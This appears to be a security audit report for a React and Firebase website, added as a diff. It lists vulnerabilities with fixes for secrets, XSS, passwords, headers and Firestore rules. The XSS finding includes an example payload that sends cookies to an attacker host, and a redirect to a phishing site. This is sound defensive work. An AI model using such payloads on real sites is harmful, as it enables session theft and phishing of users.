@@ -1,0 +1,955 @@
+# COMPREHENSIVE SECURITY AUDIT REPORT
+# Enarxi Website - Security Analysis & Recommendations
+# Generated: October 18, 2025
+
+================================================================================
+EXECUTIVE SUMMARY
+================================================================================
+
+This report identifies CRITICAL, HIGH, MEDIUM, and LOW severity security issues
+in your codebase. Immediate action is required on CRITICAL and HIGH issues
+before production deployment.
+
+Overall Security Score: 5.5/10 (NEEDS IMPROVEMENT)
+
+CRITICAL Issues: 3
+HIGH Issues: 5
+MEDIUM Issues: 6
+LOW Issues: 4
+
+================================================================================
+CRITICAL SECURITY ISSUES (IMMEDIATE ACTION REQUIRED)
+================================================================================
+
+1. ❌ EXPOSED API SECRETS IN CLIENT-SIDE CODE
+   Severity: CRITICAL
+   Location: src/utils/uploadToCloudinary.js (Lines 72-73)
+   
+   Issue:
+   - Cloudinary API_SECRET is exposed in client-side code
+   - API secrets should NEVER be in frontend code
+   - Anyone can view your API secret in browser DevTools
+   
+   Code:
+   ```javascript
+   const API_SECRET = import.meta.env.VITE_CLOUDINARY_API_SECRET;
+   ```
+   
+   Impact:
+   - Attackers can delete/modify your Cloudinary assets
+   - Unauthorized uploads to your account
+   - Potential data breach and service abuse
+   - Financial impact from unauthorized usage
+   
+   Resolution:
+   ✅ Move Cloudinary deletion to Firebase Cloud Functions
+   ✅ Use server-side signed requests
+   ✅ Remove VITE_CLOUDINARY_API_SECRET from .env
+   ✅ Implement the provided cloudinaryDelete.js function properly
+   
+   Implementation:
+   ```javascript
+   // In Firebase Cloud Functions (functions/cloudinaryDelete.js)
+   const functions = require("firebase-functions");
+   const cloudinary = require("cloudinary").v2;
+   
+   cloudinary.config({
+     cloud_name: functions.config().cloudinary.cloud_name,
+     api_key: functions.config().cloudinary.api_key,
+     api_secret: functions.config().cloudinary.api_secret,
+   });
+   
+   exports.deleteCloudinaryImage = functions.https.onCall(async (data, context) => {
+     // Verify admin authentication
+     if (!context.auth) {
+       throw new functions.https.HttpsError("unauthenticated", "User not logged in");
+     }
+     
+     const userDoc = await admin.firestore()
+       .collection("users")
+       .doc(context.auth.uid)
+       .get();
+     
+     if (!userDoc.exists || userDoc.data().role !== "admin") {
+       throw new functions.https.HttpsError("permission-denied", "Only admins can delete images");
+     }
+     
+     const { publicId } = data;
+     
+     try {
+       const result = await cloudinary.uploader.destroy(publicId);
+       return { success: true, result };
+     } catch (error) {
+       throw new functions.https.HttpsError("internal", error.message);
+     }
+   });
+   ```
+   
+   Client-side update:
+   ```javascript
+   // src/utils/uploadToCloudinary.js
+   import { getFunctions, httpsCallable } from 'firebase/functions';
+   
+   export async function deleteFromCloudinary(publicId) {
+     const functions = getFunctions();
+     const deleteImage = httpsCallable(functions, 'deleteCloudinaryImage');
+     
+     try {
+       const result = await deleteImage({ publicId });
+       return result.data;
+     } catch (error) {
+       console.error('Cloudinary deletion error:', error);
+       throw error;
+     }
+   }
+   ```
+
+2. ❌ XSS VULNERABILITY - UNSANITIZED HTML RENDERING
+   Severity: CRITICAL
+   Locations:
+   - src/routers/Blog.jsx (Lines 150-151, 246)
+   - src/routers/admin/blogs/BlogViewModal.jsx (Lines 97-99)
+   
+   Issue:
+   - User-generated blog content rendered with dangerouslySetInnerHTML
+   - No HTML sanitization before rendering
+   - Direct XSS attack vector
+   
+   Code:
+   ```javascript
+   <p dangerouslySetInnerHTML={{ __html: blog.desc.slice(0, 100) + "..." }} />
+   <div dangerouslySetInnerHTML={{ __html: selected.desc }} />
+   <div dangerouslySetInnerHTML={{ __html: blog.content }} />
+   ```
+   
+   Impact:
+   - Attackers can inject malicious JavaScript
+   - Session hijacking via cookie theft
+   - Phishing attacks on your users
+   - Defacement of your website
+   - Credential theft
+   
+   Attack Example:
+   ```javascript
+   // Malicious blog content
+   "<img src=x onerror='fetch(\"https://attacker.com?cookie=\"+document.cookie)'>"
+   "<script>window.location='https://phishing-site.com'</script>"
+   ```
+   
+   Resolution:
+   ✅ Install DOMPurify library
+   ✅ Sanitize all HTML before rendering
+   ✅ Use Content Security Policy headers
+   
+   Implementation:
+   ```bash
+   npm install dompurify
+   npm install --save-dev @types/dompurify
+   ```
+   
+   ```javascript
+   // src/utils/sanitizeHtml.js
+   import DOMPurify from 'dompurify';
+   
+   export function sanitizeHtml(dirty) {
+     return DOMPurify.sanitize(dirty, {
+       ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'u', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'ul', 'ol', 'li', 'a', 'blockquote', 'code', 'pre'],
+       ALLOWED_ATTR: ['href', 'target', 'rel'],
+       ALLOW_DATA_ATTR: false,
+     });
+   }
+   ```
+   
+   Update components:
+   ```javascript
+   import { sanitizeHtml } from '@/utils/sanitizeHtml';
+   
+   <div dangerouslySetInnerHTML={{ __html: sanitizeHtml(blog.content) }} />
+   ```
+
+3. ❌ MISSING ENVIRONMENT VARIABLE VALIDATION
+   Severity: CRITICAL
+   Location: src/lib/firebase.js
+   
+   Issue:
+   - Firebase config uses env variables without validation
+   - App initializes with undefined values if .env is missing
+   - Silent failures in production
+   
+   Code:
+   ```javascript
+   const firebaseConfig = {
+     apiKey: import.meta.env.VITE_FIREBASE_API_KEY,
+     authDomain: import.meta.env.VITE_FIREBASE_AUTH_DOMAIN,
+     // ... no validation
+   };
+   ```
+   
+   Impact:
+   - App fails silently in production
+   - Authentication breaks without clear error
+   - Difficult to debug deployment issues
+   
+   Resolution:
+   ✅ Add environment variable validation
+   ✅ Fail fast with clear error messages
+   ✅ Create .env.example file
+   
+   Implementation:
+   ```javascript
+   // src/lib/firebase.js
+   const requiredEnvVars = {
+     VITE_FIREBASE_API_KEY: import.meta.env.VITE_FIREBASE_API_KEY,
+     VITE_FIREBASE_AUTH_DOMAIN: import.meta.env.VITE_FIREBASE_AUTH_DOMAIN,
+     VITE_FIREBASE_PROJECT_ID: import.meta.env.VITE_FIREBASE_PROJECT_ID,
+     VITE_FIREBASE_STORAGE_BUCKET: import.meta.env.VITE_FIREBASE_STORAGE_BUCKET,
+     VITE_FIREBASE_MESSAGING_SENDER_ID: import.meta.env.VITE_FIREBASE_MESSAGING_SENDER_ID,
+     VITE_FIREBASE_APP_ID: import.meta.env.VITE_FIREBASE_APP_ID,
+   };
+   
+   const missingVars = Object.entries(requiredEnvVars)
+     .filter(([key, value]) => !value)
+     .map(([key]) => key);
+   
+   if (missingVars.length > 0) {
+     throw new Error(
+       `Missing required environment variables: ${missingVars.join(', ')}\n` +
+       `Please check your .env file and ensure all Firebase configuration variables are set.`
+     );
+   }
+   
+   const firebaseConfig = {
+     apiKey: requiredEnvVars.VITE_FIREBASE_API_KEY,
+     authDomain: requiredEnvVars.VITE_FIREBASE_AUTH_DOMAIN,
+     projectId: requiredEnvVars.VITE_FIREBASE_PROJECT_ID,
+     storageBucket: requiredEnvVars.VITE_FIREBASE_STORAGE_BUCKET,
+     messagingSenderId: requiredEnvVars.VITE_FIREBASE_MESSAGING_SENDER_ID,
+     appId: requiredEnvVars.VITE_FIREBASE_APP_ID,
+   };
+   ```
+
+================================================================================
+HIGH SECURITY ISSUES (ACTION REQUIRED BEFORE PRODUCTION)
+================================================================================
+
+4. ⚠️ MISSING SECURITY HEADERS
+   Severity: HIGH
+   Location: vercel.json, index.html
+   
+   Issue:
+   - No Content Security Policy (CSP)
+   - No X-Frame-Options header
+   - No X-Content-Type-Options header
+   - Missing security headers expose app to attacks
+   
+   Impact:
+   - Clickjacking attacks possible
+   - XSS attacks easier to execute
+   - MIME-type sniffing vulnerabilities
+   
+   Resolution:
+   ✅ Add security headers in vercel.json
+   ✅ Implement strict CSP
+   
+   Implementation:
+   ```json
+   // vercel.json
+   {
+     "headers": [
+       {
+         "source": "/(.*)",
+         "headers": [
+           {
+             "key": "X-Frame-Options",
+             "value": "DENY"
+           },
+           {
+             "key": "X-Content-Type-Options",
+             "value": "nosniff"
+           },
+           {
+             "key": "Referrer-Policy",
+             "value": "strict-origin-when-cross-origin"
+           },
+           {
+             "key": "Permissions-Policy",
+             "value": "camera=(), microphone=(), geolocation=()"
+           },
+           {
+             "key": "X-XSS-Protection",
+             "value": "1; mode=block"
+           },
+           {
+             "key": "Content-Security-Policy",
+             "value": "default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval' https://www.googletagmanager.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data: https: blob:; connect-src 'self' https://*.firebaseio.com https://*.googleapis.com https://api.cloudinary.com; frame-ancestors 'none';"
+           }
+         ]
+       }
+     ],
+     "rewrites": [
+       {
+         "source": "/(.*)",
+         "destination": "/"
+       }
+     ]
+   }
+   ```
+
+5. ⚠️ WEAK PASSWORD POLICY
+   Severity: HIGH
+   Location: src/routers/admin/AddStaffModal.jsx (Line 29)
+   
+   Issue:
+   - Minimum password length is only 6 characters
+   - No complexity requirements
+   - Vulnerable to brute force attacks
+   
+   Code:
+   ```javascript
+   if (formData.password.length < 6) {
+     setFormError('Password must be at least 6 characters long.');
+     return;
+   }
+   ```
+   
+   Impact:
+   - Weak passwords compromise admin accounts
+   - Easy brute force attacks
+   - Account takeover risks
+   
+   Resolution:
+   ✅ Enforce strong password policy
+   ✅ Add password complexity validation
+   ✅ Consider implementing password strength meter
+   
+   Implementation:
+   ```javascript
+   // src/utils/passwordValidation.js
+   export function validatePassword(password) {
+     const errors = [];
+     
+     if (password.length < 12) {
+       errors.push('Password must be at least 12 characters long');
+     }
+     
+     if (!/[A-Z]/.test(password)) {
+       errors.push('Password must contain at least one uppercase letter');
+     }
+     
+     if (!/[a-z]/.test(password)) {
+       errors.push('Password must contain at least one lowercase letter');
+     }
+     
+     if (!/[0-9]/.test(password)) {
+       errors.push('Password must contain at least one number');
+     }
+     
+     if (!/[!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]/.test(password)) {
+       errors.push('Password must contain at least one special character');
+     }
+     
+     return {
+       isValid: errors.length === 0,
+       errors
+     };
+   }
+   ```
+   
+   Update AddStaffModal.jsx:
+   ```javascript
+   import { validatePassword } from '@/utils/passwordValidation';
+   
+   const handleSubmit = async (e) => {
+     e.preventDefault();
+     setFormError('');
+     
+     if (formData.password !== formData.confirmPassword) {
+       setFormError('Passwords do not match.');
+       return;
+     }
+     
+     const passwordCheck = validatePassword(formData.password);
+     if (!passwordCheck.isValid) {
+       setFormError(passwordCheck.errors.join('. '));
+       return;
+     }
+     
+     // ... rest of the code
+   };
+   ```
+
+6. ⚠️ FIRESTORE SECURITY RULES - POTENTIAL ISSUES
+   Severity: HIGH
+   Location: firestore.rules
+   
+   Issue:
+   - Testimonials allow unrestricted creation (Line 42)
+   - Potential for spam and abuse
+   - No rate limiting
+   
+   Code:
+   ```
+   match /testimonials/{testimonialId} {
+     allow create: if true;  // Anyone can create!
+   }
+   ```
+   
+   Impact:
+   - Spam testimonials
+   - Database pollution
+   - Potential DoS through excessive writes
+   - Cost implications from Firebase usage
+   
+   Resolution:
+   ✅ Add authentication requirement
+   ✅ Implement rate limiting via Cloud Functions
+   ✅ Add data validation rules
+   
+   Implementation:
+   ```
+   // firestore.rules
+   match /testimonials/{testimonialId} {
+     // Only authenticated users can create testimonials
+     allow create: if request.auth != null 
+                   && request.resource.data.keys().hasAll(['name', 'message', 'rating'])
+                   && request.resource.data.name is string
+                   && request.resource.data.name.size() > 0
+                   && request.resource.data.name.size() <= 100
+                   && request.resource.data.message is string
+                   && request.resource.data.message.size() > 0
+                   && request.resource.data.message.size() <= 1000
+                   && request.resource.data.rating is number
+                   && request.resource.data.rating >= 1
+                   && request.resource.data.rating <= 5;
+     
+     allow read: if isAdmin() || resource.data.status == 'approved';
+     allow update: if isAdmin();
+     allow delete: if isAdmin();
+   }
+   ```
+   
+   Add rate limiting in Cloud Functions:
+   ```javascript
+   // functions/index.js
+   const rateLimit = require('express-rate-limit');
+   
+   const testimonialLimiter = rateLimit({
+     windowMs: 24 * 60 * 60 * 1000, // 24 hours
+     max: 1, // 1 testimonial per day per IP
+     message: 'Too many testimonials submitted. Please try again tomorrow.'
+   });
+   ```
+
+7. ⚠️ EXCESSIVE CONSOLE LOGGING IN PRODUCTION
+   Severity: HIGH
+   Location: Multiple files (100+ instances)
+   
+   Issue:
+   - console.log statements throughout codebase
+   - Sensitive data potentially logged
+   - Performance impact
+   - Information disclosure
+   
+   Examples:
+   - src/utils/uploadToCloudinary.js: Logs API keys (Line 78)
+   - Multiple files log user data, errors, etc.
+   
+   Impact:
+   - Sensitive information exposed in browser console
+   - Performance degradation
+   - Easier for attackers to understand app logic
+   
+   Resolution:
+   ✅ Remove all console.log in production
+   ✅ Use proper logging service
+   ✅ Implement conditional logging
+   
+   Implementation:
+   ```javascript
+   // src/utils/logger.js
+   const isDevelopment = import.meta.env.MODE === 'development';
+   
+   export const logger = {
+     log: (...args) => {
+       if (isDevelopment) {
+         console.log(...args);
+       }
+     },
+     error: (...args) => {
+       if (isDevelopment) {
+         console.error(...args);
+       } else {
+         // Send to error tracking service (e.g., Sentry)
+         // Sentry.captureException(args[0]);
+       }
+     },
+     warn: (...args) => {
+       if (isDevelopment) {
+         console.warn(...args);
+       }
+     }
+   };
+   ```
+   
+   Replace all console.log:
+   ```javascript
+   // Before
+   console.log('User data:', userData);
+   
+   // After
+   import { logger } from '@/utils/logger';
+   logger.log('User data:', userData);
+   ```
+   
+   Add to vite.config.js for production builds:
+   ```javascript
+   export default defineConfig({
+     // ... other config
+     build: {
+       minify: 'terser',
+       terserOptions: {
+         compress: {
+           drop_console: true,
+           drop_debugger: true
+         }
+       }
+     }
+   });
+   ```
+
+8. ⚠️ MISSING RATE LIMITING ON AUTHENTICATION
+   Severity: HIGH
+   Location: src/routers/admin/Login.jsx, src/routers/admin/StaffLogin.jsx
+   
+   Issue:
+   - No rate limiting on login attempts
+   - Vulnerable to brute force attacks
+   - No account lockout mechanism
+   
+   Impact:
+   - Brute force password attacks
+   - Account compromise
+   - Resource exhaustion
+   
+   Resolution:
+   ✅ Implement Firebase App Check
+   ✅ Add rate limiting via Cloud Functions
+   ✅ Implement account lockout after failed attempts
+   
+   Implementation:
+   ```javascript
+   // Enable Firebase App Check
+   // In src/lib/firebase.js
+   import { initializeAppCheck, ReCaptchaV3Provider } from 'firebase/app-check';
+   
+   const appCheck = initializeAppCheck(primaryApp, {
+     provider: new ReCaptchaV3Provider('YOUR_RECAPTCHA_SITE_KEY'),
+     isTokenAutoRefreshEnabled: true
+   });
+   ```
+   
+   Add to Cloud Functions:
+   ```javascript
+   // functions/index.js
+   exports.trackLoginAttempts = functions.auth.user().onCreate(async (user) => {
+     // Track failed login attempts
+     // Implement lockout logic
+   });
+   ```
+
+================================================================================
+MEDIUM SECURITY ISSUES (SHOULD BE ADDRESSED)
+================================================================================
+
+9. ⚠️ NO INPUT VALIDATION ON FORMS
+   Severity: MEDIUM
+   Location: Multiple form components
+   
+   Issue:
+   - Client-side validation only
+   - No server-side validation
+   - Potential for data integrity issues
+   
+   Resolution:
+   ✅ Add Zod schema validation
+   ✅ Validate on both client and server
+   ✅ Use react-hook-form with Zod resolver
+   
+   Implementation:
+   ```javascript
+   // src/schemas/staffSchema.js
+   import { z } from 'zod';
+   
+   export const staffSchema = z.object({
+     name: z.string().min(2, 'Name must be at least 2 characters').max(100),
+     email: z.string().email('Invalid email address'),
+     password: z.string().min(12, 'Password must be at least 12 characters'),
+     role: z.enum(['employee', 'intern']),
+   });
+   ```
+
+10. ⚠️ MISSING ERROR BOUNDARIES
+    Severity: MEDIUM
+    Location: App-wide
+    
+    Issue:
+    - No global error boundary
+    - Errors can crash entire app
+    - Poor user experience
+    
+    Resolution:
+    ✅ Implement React Error Boundaries
+    ✅ Add error tracking (Sentry)
+    
+    Implementation:
+    ```javascript
+    // src/components/ErrorBoundary.jsx
+    import React from 'react';
+    
+    class ErrorBoundary extends React.Component {
+      constructor(props) {
+        super(props);
+        this.state = { hasError: false, error: null };
+      }
+      
+      static getDerivedStateFromError(error) {
+        return { hasError: true, error };
+      }
+      
+      componentDidCatch(error, errorInfo) {
+        // Log to error tracking service
+        console.error('Error caught by boundary:', error, errorInfo);
+      }
+      
+      render() {
+        if (this.state.hasError) {
+          return (
+            <div className="min-h-screen flex items-center justify-center">
+              <div className="text-center">
+                <h1 className="text-2xl font-bold mb-4">Something went wrong</h1>
+                <button onClick={() => window.location.reload()}>
+                  Reload Page
+                </button>
+              </div>
+            </div>
+          );
+        }
+        
+        return this.props.children;
+      }
+    }
+    ```
+
+11. ⚠️ INSECURE VITE SERVER CONFIGURATION
+    Severity: MEDIUM
+    Location: vite.config.js (Line 26)
+    
+    Issue:
+    - Server exposed to all network interfaces (0.0.0.0)
+    - Development server accessible from network
+    
+    Code:
+    ```javascript
+    server: {
+      port: 3001,
+      host: '0.0.0.0', // Exposes to network!
+    }
+    ```
+    
+    Resolution:
+    ✅ Use localhost for development
+    ✅ Only expose when needed
+    
+    ```javascript
+    server: {
+      port: 3001,
+      host: 'localhost', // More secure
+      // Use 0.0.0.0 only when explicitly needed for network testing
+    }
+    ```
+
+12. ⚠️ NO HTTPS ENFORCEMENT
+    Severity: MEDIUM
+    Location: Production deployment
+    
+    Issue:
+    - No automatic HTTPS redirect
+    - Potential for MITM attacks
+    
+    Resolution:
+    ✅ Add HTTPS redirect in vercel.json
+    
+    ```json
+    {
+      "headers": [
+        {
+          "source": "/(.*)",
+          "headers": [
+            {
+              "key": "Strict-Transport-Security",
+              "value": "max-age=63072000; includeSubDomains; preload"
+            }
+          ]
+        }
+      ]
+    }
+    ```
+
+13. ⚠️ MISSING DEPENDENCY SECURITY AUDIT
+    Severity: MEDIUM
+    Location: package.json
+    
+    Issue:
+    - No regular dependency audits
+    - Potential vulnerable dependencies
+    
+    Resolution:
+    ✅ Run npm audit regularly
+    ✅ Set up automated security scanning
+    ✅ Use Dependabot or Snyk
+    
+    ```bash
+    npm audit
+    npm audit fix
+    ```
+    
+    Add to package.json scripts:
+    ```json
+    "scripts": {
+      "audit": "npm audit",
+      "audit:fix": "npm audit fix"
+    }
+    ```
+
+14. ⚠️ FIREBASE CLOUD FUNCTIONS NOT USING LATEST NODE VERSION
+    Severity: MEDIUM
+    Location: functions/package.json (Line 14)
+    
+    Issue:
+    - Using Node 22 which may have compatibility issues
+    - Should use LTS version
+    
+    Resolution:
+    ✅ Use Node 20 LTS
+    
+    ```json
+    "engines": {
+      "node": "20"
+    }
+    ```
+
+================================================================================
+LOW SECURITY ISSUES (NICE TO HAVE)
+================================================================================
+
+15. ℹ️ MISSING .env.example FILE
+    Severity: LOW
+    
+    Issue:
+    - No template for environment variables
+    - Difficult for new developers to set up
+    
+    Resolution:
+    ✅ Create .env.example
+    
+    ```bash
+    # .env.example
+    # Firebase Configuration
+    VITE_FIREBASE_API_KEY=your_api_key_here
+    VITE_FIREBASE_AUTH_DOMAIN=your_auth_domain_here
+    VITE_FIREBASE_PROJECT_ID=your_project_id_here
+    VITE_FIREBASE_STORAGE_BUCKET=your_storage_bucket_here
+    VITE_FIREBASE_MESSAGING_SENDER_ID=your_messaging_sender_id_here
+    VITE_FIREBASE_APP_ID=your_app_id_here
+    
+    # Cloudinary Configuration (Upload only - NO SECRET!)
+    VITE_CLOUDINARY_CLOUD_NAME=your_cloud_name_here
+    VITE_CLOUDINARY_UPLOAD_PRESET=your_upload_preset_here
+    VITE_CLOUDINARY_API_KEY=your_api_key_here
+    # DO NOT ADD VITE_CLOUDINARY_API_SECRET - Use Cloud Functions instead!
+    ```
+
+16. ℹ️ NO SECURITY.md FILE
+    Severity: LOW
+    
+    Resolution:
+    ✅ Create SECURITY.md for responsible disclosure
+    
+    ```markdown
+    # Security Policy
+    
+    ## Reporting a Vulnerability
+    
+    If you discover a security vulnerability, please email security@enarxi.com
+    
+    Please do not open public issues for security vulnerabilities.
+    ```
+
+17. ℹ️ MISSING CORS CONFIGURATION
+    Severity: LOW
+    Location: Firebase Cloud Functions
+    
+    Resolution:
+    ✅ Add CORS configuration to Cloud Functions
+    
+    ```javascript
+    const cors = require('cors')({ origin: true });
+    
+    exports.myFunction = functions.https.onRequest((req, res) => {
+      cors(req, res, () => {
+        // Function logic
+      });
+    });
+    ```
+
+18. ℹ️ NO SUBRESOURCE INTEGRITY (SRI)
+    Severity: LOW
+    Location: index.html
+    
+    Resolution:
+    ✅ Add SRI hashes for external scripts (if any)
+
+================================================================================
+PRODUCTION DEPLOYMENT CHECKLIST
+================================================================================
+
+Before deploying to production, ensure:
+
+[ ] 1. Remove all Cloudinary API secrets from client code
+[ ] 2. Implement server-side Cloudinary deletion via Cloud Functions
+[ ] 3. Install and implement DOMPurify for XSS protection
+[ ] 4. Add environment variable validation
+[ ] 5. Configure security headers in vercel.json
+[ ] 6. Implement strong password policy (12+ chars, complexity)
+[ ] 7. Update Firestore rules for testimonials
+[ ] 8. Remove/replace all console.log statements
+[ ] 9. Enable Firebase App Check with reCAPTCHA
+[ ] 10. Add rate limiting on authentication
+[ ] 11. Implement proper error boundaries
+[ ] 12. Run npm audit and fix vulnerabilities
+[ ] 13. Set up error tracking (Sentry/LogRocket)
+[ ] 14. Enable HTTPS with HSTS headers
+[ ] 15. Create .env.example file
+[ ] 16. Test all security fixes in staging environment
+[ ] 17. Perform penetration testing
+[ ] 18. Set up monitoring and alerting
+[ ] 19. Create incident response plan
+[ ] 20. Document security procedures
+
+================================================================================
+RECOMMENDED SECURITY TOOLS & SERVICES
+================================================================================
+
+1. Error Tracking & Monitoring:
+   - Sentry (https://sentry.io) - Error tracking
+   - LogRocket (https://logrocket.com) - Session replay
+   - Firebase Performance Monitoring
+
+2. Security Scanning:
+   - Snyk (https://snyk.io) - Dependency scanning
+   - Dependabot (GitHub) - Automated dependency updates
+   - OWASP ZAP - Penetration testing
+
+3. Authentication & Security:
+   - Firebase App Check - Bot protection
+   - reCAPTCHA v3 - Spam prevention
+   - 2FA/MFA for admin accounts
+
+4. Code Quality:
+   - ESLint security plugins
+   - SonarQube - Code quality & security
+   - Husky - Pre-commit hooks
+
+================================================================================
+ESTIMATED REMEDIATION TIME
+================================================================================
+
+Critical Issues: 8-12 hours
+High Issues: 12-16 hours
+Medium Issues: 6-8 hours
+Low Issues: 2-4 hours
+
+Total: 28-40 hours of development time
+
+================================================================================
+PRIORITY ORDER FOR FIXES
+================================================================================
+
+Week 1 (CRITICAL - Must complete before any production deployment):
+1. Move Cloudinary API secret to Cloud Functions
+2. Implement XSS protection with DOMPurify
+3. Add environment variable validation
+4. Configure security headers
+
+Week 2 (HIGH - Complete before public launch):
+5. Implement strong password policy
+6. Fix Firestore security rules
+7. Remove console.log statements
+8. Add rate limiting on authentication
+
+Week 3 (MEDIUM - Improve overall security posture):
+9. Add input validation with Zod
+10. Implement error boundaries
+11. Fix Vite server configuration
+12. Run dependency audit
+
+Week 4 (LOW - Polish and documentation):
+13. Create .env.example
+14. Add SECURITY.md
+15. Configure CORS properly
+16. Final security review
+
+================================================================================
+ADDITIONAL RECOMMENDATIONS
+================================================================================
+
+1. Security Training:
+   - Train team on OWASP Top 10
+   - Regular security awareness sessions
+   - Code review focused on security
+
+2. Development Practices:
+   - Implement security-focused code reviews
+   - Use pre-commit hooks for security checks
+   - Regular penetration testing
+   - Security regression testing
+
+3. Monitoring & Incident Response:
+   - Set up real-time security monitoring
+   - Create incident response playbook
+   - Regular security audits (quarterly)
+   - Maintain security changelog
+
+4. Compliance:
+   - GDPR compliance review (if applicable)
+   - Data retention policies
+   - Privacy policy updates
+   - Terms of service review
+
+================================================================================
+CONCLUSION
+================================================================================
+
+Your application has several critical security vulnerabilities that MUST be
+addressed before production deployment. The most critical issues are:
+
+1. Exposed API secrets in client-side code
+2. XSS vulnerabilities from unsanitized HTML
+3. Missing environment variable validation
+
+These issues could lead to:
+- Complete compromise of your Cloudinary account
+- User data theft through XSS attacks
+- Application downtime and instability
+
+Immediate action is required. Do not deploy to production until at least
+all CRITICAL and HIGH severity issues are resolved.
+
+Estimated time to secure for production: 20-28 hours of focused development.
+
+For questions or assistance with implementation, please consult with a
+security professional or reach out to the development team.
+
+================================================================================
+END OF REPORT
+================================================================================
